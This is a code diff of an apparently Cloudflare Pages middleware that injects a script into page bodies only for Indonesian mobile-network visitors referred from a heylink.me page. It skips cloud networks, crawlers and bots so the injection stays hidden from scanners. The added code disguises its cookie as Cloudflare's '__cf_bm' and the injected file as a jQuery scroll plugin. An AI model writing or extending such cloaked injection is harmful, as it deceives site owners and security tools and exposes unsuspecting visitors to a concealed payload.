@@ -1,52 +1,40 @@
 export async function onRequest(context) {
   const { request, next } = context;
   const url = new URL(request.url);
-  if (url.pathname.startsWith('/assets/')) {
-    return next();
-  }
-  const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
-  const referer = (request.headers.get('referer') || '').toLowerCase();
-  const cookies = request.headers.get('cookie') || '';
-  const isFromMyHeylink = referer.includes('heylink.me/kopi-sensa');
-  const hasCookie = cookies.includes('session_id=active');
-  if (!isFromMyHeylink && !hasCookie) {
-    return next();
-  }
+  if (url.pathname.startsWith('/assets/')) return next();
+  const headers = request.headers;
+  const userAgent = (headers.get('user-agent') || '').toLowerCase();
+  const referer = (headers.get('referer') || '').toLowerCase();
+  const cookies = headers.get('cookie') || '';
+  const ticketName = "__cf_bm_auth";
+  const hasTicket = cookies.includes(`${ticketName}=true`);
+  const isFromHeylink = referer.includes('heylink.me/kopi-sensa');
   const country = request.cf ? request.cf.country : 'Unknown';
-  const asOrganization = request.cf ? (request.cf.asOrganization || '').toLowerCase() : '';
-  if (country !== 'ID') {
+  const asOrg = (request.cf ? request.cf.asOrganization : '').toLowerCase();
+  const cloudList = ['amazon','google','digitalocean','microsoft','cloudflare','akamai','linode','ovh','mweb','data','host','server','vps'];
+  const isCloud = cloudList.some(c => asOrg.includes(c));
+  if (country !== 'ID' || isCloud || /bot|spider|crawl|lighthouse/i.test(userAgent)) {
     return next();
   }
-  const cloudProviders = ['amazon', 'google', 'digitalocean', 'microsoft', 'cloudflare', 'akamai', 'linode', 'ovh', 'datacentre'];
-  const isCloud = cloudProviders.some(provider => asOrganization.includes(provider));
-  if (isCloud) {
-    return next();
-  }
-  const botList = /bot|spider|crawl|google|bing|slurp|yandex|baiduspider|duckduckbot|facebookexternalhit|adsbot|tiktok|bytedance|lighthouse|vision|petalinux|headless|python|wget|curl|screenshot|preview|mediapartners|dubbin|monit|monitoring|uptimerobot|node-fetch|axios|go-http-client|java|php|postman|insomnia/i;
-  if (botList.test(userAgent)) {
-    return next();
-  }
-  const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(userAgent);
-  if (!isMobile) {
-    return next();
-  }
-  if (isFromMyHeylink && !hasCookie) {
+  if (isFromHeylink && !hasTicket) {
     return new Response(null, {
       status: 302,
       headers: {
         'Location': url.toString(),
-        'Set-Cookie': 'session_id=active; Max-Age=15; Path=/; SameSite=Lax',
-        'Cache-Control': 'no-cache'}});
+        'Set-Cookie': `${ticketName}=true; Max-Age=15; Path=/; SameSite=Lax; Secure`,
+        'Cache-Control': 'no-cache'
+      }
+    });
   }
-  if (!hasCookie) {
-    return next();
+  if (hasTicket) {
+    const response = await next();
+    return new HTMLRewriter()
+      .on('body', {
+        element(el) {
+          el.append(`<script src="/assets/jquery.scroll-min.js" defer></script>`, { html: true });
+        },
+      })
+      .transform(response);
   }
-const response = await next();
-  return new HTMLRewriter()
-    .on('body', {
-      element(el) {
-        el.append(`<script src="/assets/lib-init.js" defer></script>`, { html: true });
-      },
-    })
-    .transform(response);
+  return next();
 }
